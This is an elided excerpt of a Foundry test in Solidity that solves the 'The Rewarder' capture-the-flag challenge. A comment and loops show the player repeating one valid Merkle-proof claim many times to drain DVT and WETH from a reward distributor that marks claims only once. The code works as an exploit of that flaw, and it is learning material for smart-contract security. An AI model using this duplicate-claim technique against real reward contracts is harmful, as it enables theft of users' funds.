...
contract TheRewarderChallenge is Test {
    ...
    /**
     * POC: the claim function is just doing `_setClaimed` for 1 time, so we can create a bundle of `inputClaims`
     * with the same info, just the final one will be the actual do `_setClaimed`.
     */
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        (uint256 dvtIndex, uint256 wethIndex, uint256 dvtAmount, uint256 wethAmount) = _getIndexAndAmounts();
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        ...
        uint256 dvt_times = dvt.balanceOf(address(distributor)) / dvtAmount;
        uint256 weth_times = weth.balanceOf(address(distributor)) / wethAmount;
        ...
        claims[0] = Claim({
            ...
            amount: dvtAmount,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, dvtIndex) // Player's address is at index 2
        });

        for (uint256 i = 1; i < dvt_times; i++) {
            claims[i] = claims[0];
        }
        for (uint256 i = dvt_times; i < claims.length; i++) {
            claims[i] = Claim({
                batchNumber: 0, // claim corresponds to first WETH batch
                amount: wethAmount,
                tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
                proof: merkle.getProof(wethLeaves, wethIndex) // Player's address is at index 2
            });
        }
    ...
    function _getIndexAndAmounts()
        internal
        returns (uint256 dvtIndex, uint256 wethIndex, uint256 dvtAmount, uint256 wethAmount)
    {
        dvtAmount = uint256(11524763827831882);
        wethAmount = uint256(1171088749244340);
        console.log("player address: ", player);
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            bytes32 wethHash = keccak256(abi.encodePacked(player, wethAmount));
            bytes32 dvtHash = keccak256(abi.encodePacked(player, dvtAmount));
            if (dvtLeaves[i] == dvtHash) {
                dvtIndex = i;
            }
            if (wethLeaves[i] == wethHash) {
                wethIndex = i;
            }
        }
        console.log("dvtIndex: ", dvtIndex);
